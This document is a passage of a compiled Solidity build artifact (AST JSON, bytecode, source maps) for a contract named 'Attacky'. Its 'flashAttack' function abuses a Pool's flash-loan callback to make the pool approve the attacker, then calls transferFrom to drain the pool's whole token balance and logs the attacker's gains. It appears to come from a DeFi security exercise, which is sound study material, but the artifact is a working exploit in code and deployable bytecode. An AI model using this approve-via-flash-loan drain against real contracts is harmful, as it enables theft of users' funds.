                          "typeIdentifier": "t_stringliteral_095ea7b334ae44009aa867bfb386f5c3b4b443ac6f0ee573fa91c4608fbadfba",
                          "typeString": "literal_string \"approve(address,uint256)\""
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 1104,
                        "name": "abi",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": -1,
                        "src": "957:3:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_abi",
                          "typeString": "abi"
                        }
                      },
                      "id": 1105,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "memberLocation": "961:19:14",
                      "memberName": "encodeWithSignature",
                      "nodeType": "MemberAccess",
                      "src": "957:23:14",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
                        "typeString": "function (string memory) pure returns (bytes memory)"
                      }
                    },
                    "id": 1118,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "957:99:14",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes_memory_ptr",
                      "typeString": "bytes memory"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "937:119:14"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1123,
                        "name": "amount",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1085,
                        "src": "1088:6:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "id": 1124,
                        "name": "borrower",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1089,
                        "src": "1096:8:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1125,
                        "name": "target",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1096,
                        "src": "1106:6:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1126,
                        "name": "data",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1103,
                        "src": "1114:4:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes_memory_ptr",
                          "typeString": "bytes memory"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_bytes_memory_ptr",
                          "typeString": "bytes memory"
                        }
                      ],
                      "expression": {
                        "id": 1120,
                        "name": "pool",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1036,
                        "src": "1066:4:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_Pool_$3845",
                          "typeString": "contract Pool"
                        }
                      },
                      "id": 1122,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "1071:16:14",
                      "memberName": "requestFlashLoan",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 3844,
                      "src": "1066:21:14",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$_t_address_$_t_address_$_t_bytes_memory_ptr_$returns$__$",
                        "typeString": "function (uint256,address,address,bytes memory) external"
                      }
                    },
                    "id": 1127,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1066:53:14",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1128,
                  "nodeType": "ExpressionStatement",
                  "src": "1066:53:14"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 1134,
                            "name": "pool",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1036,
                            "src": "1167:4:14",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Pool_$3845",
                              "typeString": "contract Pool"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_Pool_$3845",
                              "typeString": "contract Pool"
                            }
                          ],
                          "id": 1133,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1159:7:14",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 1132,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1159:7:14",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1135,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1159:13:14",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "expression": {
                          "id": 1136,
                          "name": "msg",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": -15,
                          "src": "1174:3:14",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_message",
                            "typeString": "msg"
                          }
                        },
                        "id": 1137,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberLocation": "1178:6:14",
                        "memberName": "sender",
                        "nodeType": "MemberAccess",
                        "src": "1174:10:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1142,
                                "name": "pool",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 1036,
                                "src": "1211:4:14",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_Pool_$3845",
                                  "typeString": "contract Pool"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_Pool_$3845",
                                  "typeString": "contract Pool"
                                }
                              ],
                              "id": 1141,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "1203:7:14",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1140,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "1203:7:14",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1143,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "nameLocations": [],
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "1203:13:14",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 1138,
                            "name": "tokenz",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1039,
                            "src": "1186:6:14",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$3058",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 1139,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "1193:9:14",
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 3015,
                          "src": "1186:16:14",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 1144,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1186:31:14",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 1129,
                        "name": "tokenz",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1039,
                        "src": "1139:6:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$3058",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 1131,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "1146:12:14",
                      "memberName": "transferFrom",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 3057,
                      "src": "1139:19:14",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,address,uint256) external returns (bool)"
                      }
                    },
                    "id": 1145,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1139:79:14",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 1146,
                  "nodeType": "ExpressionStatement",
                  "src": "1139:79:14"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "hexValue": "506f6f6c2062616c616e63652041465445523a20",
                        "id": 1150,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1240:22:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_ae1c905c46382391791ddea9c2501edccc6e47007f8f4423d07308e30ced0a1b",
                          "typeString": "literal_string \"Pool balance AFTER: \""
                        },
                        "value": "Pool balance AFTER: "
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1155,
                                "name": "pool",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 1036,
                                "src": "1288:4:14",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_Pool_$3845",
                                  "typeString": "contract Pool"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_Pool_$3845",
                                  "typeString": "contract Pool"
                                }
                              ],
                              "id": 1154,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "1280:7:14",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1153,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "1280:7:14",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1156,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "nameLocations": [],
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "1280:13:14",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 1151,
                            "name": "tokenz",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1039,
                            "src": "1263:6:14",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$3058",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 1152,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "1270:9:14",
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 3015,
                          "src": "1263:16:14",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 1157,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1263:31:14",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_ae1c905c46382391791ddea9c2501edccc6e47007f8f4423d07308e30ced0a1b",
                          "typeString": "literal_string \"Pool balance AFTER: \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 1147,
                        "name": "console",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 11909,
                        "src": "1228:7:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_console_$11909_$",
                          "typeString": "type(library console)"
                        }
                      },
                      "id": 1149,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "1236:3:14",
                      "memberName": "log",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 4553,
                      "src": "1228:11:14",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_view$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256) view"
                      }
                    },
                    "id": 1158,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1228:67:14",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1159,
                  "nodeType": "ExpressionStatement",
                  "src": "1228:67:14"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "hexValue": "41747461636b65722062616c616e63653a20",
                        "id": 1163,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1516:20:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_1fa4588827a42b818cab78d4dee9bbae76ebeab46eec622c30db2fefccef5516",
                          "typeString": "literal_string \"Attacker balance: \""
                        },
                        "value": "Attacker balance: "
                      },
                      {
                        "arguments": [
                          {
                            "expression": {
                              "id": 1166,
                              "name": "msg",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -15,
                              "src": "1554:3:14",
                              "typeDescriptions": {
                                "typeIdentifier": "t_magic_message",
                                "typeString": "msg"
                              }
                            },
                            "id": 1167,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberLocation": "1558:6:14",
                            "memberName": "sender",
                            "nodeType": "MemberAccess",
                            "src": "1554:10:14",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 1164,
                            "name": "tokenz",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1039,
                            "src": "1537:6:14",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$3058",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 1165,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "1544:9:14",
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 3015,
                          "src": "1537:16:14",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 1168,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1537:28:14",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_1fa4588827a42b818cab78d4dee9bbae76ebeab46eec622c30db2fefccef5516",
                          "typeString": "literal_string \"Attacker balance: \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 1160,
                        "name": "console",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 11909,
                        "src": "1504:7:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_console_$11909_$",
                          "typeString": "type(library console)"
                        }
                      },
                      "id": 1162,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "1512:3:14",
                      "memberName": "log",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 4553,
                      "src": "1504:11:14",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_view$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256) view"
                      }
                    },
                    "id": 1169,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1504:62:14",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1170,
                  "nodeType": "ExpressionStatement",
                  "src": "1504:62:14"
                }
              ]
            },
            "functionSelector": "d0231578",
            "id": 1172,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "flashAttack",
            "nameLocation": "708:11:14",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 1069,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "719:8:14"
            },
            "returnParameters": {
              "id": 1070,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "737:0:14"
            },
            "scope": 1173,
            "src": "699:874:14",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 1174,
        "src": "382:1194:14",
        "usedErrors": []
      }
    ],
    "src": "116:1461:14"
  },
  "bytecode": "60c06040526040516107f33803806107f3833981016040819052610022916100ce565b600080546001600160a01b0319166001600160a01b038316908117909155608081905260408051637e062a3560e11b8152905163fc0c546a916004808201926020929091908290030181865afa158015610080573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100a491906100ce565b6001600160a01b031660a052506100f2565b6001600160a01b03811681146100cb57600080fd5b50565b6000602082840312156100e057600080fd5b81516100eb816100b6565b9392505050565b60805160a0516106a661014d6000396000818160e201528181610199015281816103130152818161047101526104e301526000818160b50152818161016c01528181610268015281816102e2015261044401526106a66000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631755ff211461003b578063d02315781461006a575b600080fd5b60005461004e906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b610072610074565b005b604080518082018252601581527402837b7b6103130b630b731b2902122a327a9229d1605d1b602082015290516370a0823160e01b81526001600160a01b037f00000000000000000000000000000000000000000000000000000000000000008116600483015261015592917f0000000000000000000000000000000000000000000000000000000000000000909116906370a08231906024015b602060405180830381865afa15801561012c573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610150919061058a565b610520565b6040516370a0823160e01b81526001600160a01b037f00000000000000000000000000000000000000000000000000000000000000008116600483015260009130917f00000000000000000000000000000000000000000000000000000000000000009184918491908416906370a0823190602401602060405180830381865afa1580156101e7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061020b919061058a565b6040516001600160a01b039092166024830152604482015260640160408051601f198184030181529181526020820180516001600160e01b031663095ea7b360e01b17905251633e5a95a360e01b81529091506001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001690633e5a95a3906102a39087908790879087906004016105e9565b600060405180830381600087803b1580156102bd57600080fd5b505af11580156102d1573d6000803e3d6000fd5b50506040516370a0823160e01b81527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0381811660048401527f00000000000000000000000000000000000000000000000000000000000000001693506323b872dd925090339084906370a0823190602401602060405180830381865afa158015610367573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061038b919061058a565b6040516001600160e01b031960e086901b1681526001600160a01b03938416600482015292909116602483015260448201526064016020604051808303816000875af11580156103df573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104039190610625565b50604080518082018252601481527302837b7b6103130b630b731b29020a32a22a91d160651b602082015290516370a0823160e01b81526001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000811660048301526104a292917f0000000000000000000000000000000000000000000000000000000000000000909116906370a082319060240161010f565b6040805180820182526012815271020ba3a30b1b5b2b9103130b630b731b29d160751b602082015290516370a0823160e01b815233600482015261051a91907f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906370a082319060240161010f565b50505050565b610565828260405160240161053692919061064e565b60408051601f198184030181529190526020810180516001600160e01b0316632d839cb360e21b179052610569565b5050565b80516a636f6e736f6c652e6c6f67602083016000808483855afa5050505050565b60006020828403121561059c57600080fd5b5051919050565b6000815180845260005b818110156105c9576020818501810151868301820152016105ad565b506000602082860101526020601f19601f83011685010191505092915050565b8481526001600160a01b0384811660208301528316604082015260806060820181905260009061061b908301846105a3565b9695505050505050565b60006020828403121561063757600080fd5b8151801515811461064757600080fd5b9392505050565b60408152600061066160408301856105a3565b9050826020830152939250505056fea2646970667358221220c28e4734d5213b2455715f10309c8b01ae23eb927eacf5f1c37a528e49eea04664736f6c63430008130033",
  "bytecodeSha1": "0ecdaa99d734d06e31892226ae5db0c19b667f07",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.19+commit.7dd6d404"
  },
  "contractName": "Attacky",
  "coverageMap": {
    "branches": {
      "1": {},
      "13": {},
      "14": {},
      "22": {},
      "3": {},
      "5": {},
      "6": {},
      "7": {}
    },
    "statements": {
      "1": {},
      "13": {},
      "14": {
        "Attacky.flashAttack": {
          "0": [
            747,
            815
          ],
          "1": [
            1066,
            1119
          ],
          "2": [
            1139,
            1218
          ],
          "3": [
            1228,
            1295
          ],
          "4": [
            1504,
            1566
          ]
        }
      },
      "22": {
        "console.log": {
          "5": [
            5997,
            6068
          ]
        }
      },
      "3": {},
      "5": {},
      "6": {},
      "7": {}
    }
  },
  "dependencies": [
    "OpenZeppelin/openzeppelin-contracts@4.8.0/Address",
    "OpenZeppelin/openzeppelin-contracts@4.8.0/IERC20",
    "OpenZeppelin/openzeppelin-contracts@4.8.0/IERC20Permit",
    "Pool",
    "OpenZeppelin/openzeppelin-contracts@4.8.0/ReentrancyGuard",
    "OpenZeppelin/openzeppelin-contracts@4.8.0/SafeERC20",
    "console"
  ],
  "deployedBytecode": "608060405234801561001057600080fd5b50600436106100365760003560e01c80631755ff211461003b578063d02315781461006a575b600080fd5b60005461004e906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b610072610074565b005b604080518082018252601581527402837b7b6103130b630b731b2902122a327a9229d1605d1b602082015290516370a0823160e01b81526001600160a01b037f00000000000000000000000000000000000000000000000000000000000000008116600483015261015592917f0000000000000000000000000000000000000000000000000000000000000000909116906370a08231906024015b602060405180830381865afa15801561012c573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610150919061058a565b610520565b6040516370a0823160e01b81526001600160a01b037f00000000000000000000000000000000000000000000000000000000000000008116600483015260009130917f00000000000000000000000000000000000000000000000000000000000000009184918491908416906370a0823190602401602060405180830381865afa1580156101e7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061020b919061058a565b6040516001600160a01b039092166024830152604482015260640160408051601f198184030181529181526020820180516001600160e01b031663095ea7b360e01b17905251633e5a95a360e01b81529091506001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001690633e5a95a3906102a39087908790879087906004016105e9565b600060405180830381600087803b1580156102bd57600080fd5b505af11580156102d1573d6000803e3d6000fd5b50506040516370a0823160e01b81527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0381811660048401527f00000000000000000000000000000000000000000000000000000000000000001693506323b872dd925090339084906370a0823190602401602060405180830381865afa158015610367573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061038b919061058a565b6040516001600160e01b031960e086901b1681526001600160a01b03938416600482015292909116602483015260448201526064016020604051808303816000875af11580156103df573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104039190610625565b50604080518082018252601481527302837b7b6103130b630b731b29020a32a22a91d160651b602082015290516370a0823160e01b81526001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000811660048301526104a292917f0000000000000000000000000000000000000000000000000000000000000000909116906370a082319060240161010f565b6040805180820182526012815271020ba3a30b1b5b2b9103130b630b731b29d160751b602082015290516370a0823160e01b815233600482015261051a91907f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906370a082319060240161010f565b50505050565b610565828260405160240161053692919061064e565b60408051601f198184030181529190526020810180516001600160e01b0316632d839cb360e21b179052610569565b5050565b80516a636f6e736f6c652e6c6f67602083016000808483855afa5050505050565b60006020828403121561059c57600080fd5b5051919050565b6000815180845260005b818110156105c9576020818501810151868301820152016105ad565b506000602082860101526020601f19601f83011685010191505092915050565b8481526001600160a01b0384811660208301528316604082015260806060820181905260009061061b908301846105a3565b9695505050505050565b60006020828403121561063757600080fd5b8151801515811461064757600080fd5b9392505050565b60408152600061066160408301856105a3565b9050826020830152939250505056fea2646970667358221220c28e4734d5213b2455715f10309c8b01ae23eb927eacf5f1c37a528e49eea04664736f6c63430008130033",
  "deployedSourceMap": "382:1194:14:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;493:26;;;;;-1:-1:-1;;;;;493:26:14;;;;;;-1:-1:-1;;;;;178:32:23;;;160:51;;148:2;133:18;493:26:14;;;;;;;699:874;;;:::i;:::-;;;747:68;;;;;;;;;;;-1:-1:-1;;;747:68:14;;;;783:31;;-1:-1:-1;;;783:31:14;;-1:-1:-1;;;;;808:4:14;178:32:23;;783:31:14;;;160:51:23;747:68:14;;;783:6;:16;;;;;;133:18:23;;783:31:14;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;747:11;:68::i;:::-;1024:31;;-1:-1:-1;;;1024:31:14;;-1:-1:-1;;;;;1049:4:14;178:32:23;;1024:31:14;;;160:51:23;-1:-1:-1;;880:4:14;;920:6;;-1:-1:-1;;880:4:14;;1024:16;;;;;;133:18:23;;1024:31:14;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;957:99;;-1:-1:-1;;;;;603:32:23;;;957:99:14;;;585:51:23;652:18;;;645:34;558:18;;957:99:14;;;-1:-1:-1;;957:99:14;;;;;;;;;;;;;;-1:-1:-1;;;;;957:99:14;-1:-1:-1;;;957:99:14;;;1066:53;-1:-1:-1;;;1066:53:14;;957:99;;-1:-1:-1;;;;;;1066:4:14;:21;;;;:53;;1088:6;;1096:8;;1106:6;;957:99;;1066:53;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1186:31:14;;-1:-1:-1;;;1186:31:14;;1167:4;-1:-1:-1;;;;;178:32:23;;;1186:31:14;;;160:51:23;1139:6:14;:19;;-1:-1:-1;1139:19:14;;-1:-1:-1;1167:4:14;1174:10;;1139:19;;1186:16;;133:18:23;;1186:31:14;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1139:79;;-1:-1:-1;;;;;;1139:79:14;;;;;;;-1:-1:-1;;;;;1868:15:23;;;1139:79:14;;;1850:34:23;1920:15;;;;1900:18;;;1893:43;1952:18;;;1945:34;1785:18;;1139:79:14;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;1228:67:14;;;;;;;;;;;-1:-1:-1;;;1228:67:14;;;;1263:31;;-1:-1:-1;;;1263:31:14;;-1:-1:-1;;;;;1288:4:14;178:32:23;;1263:31:14;;;160:51:23;1228:67:14;;;1263:6;:16;;;;;;133:18:23;;1263:31:14;14: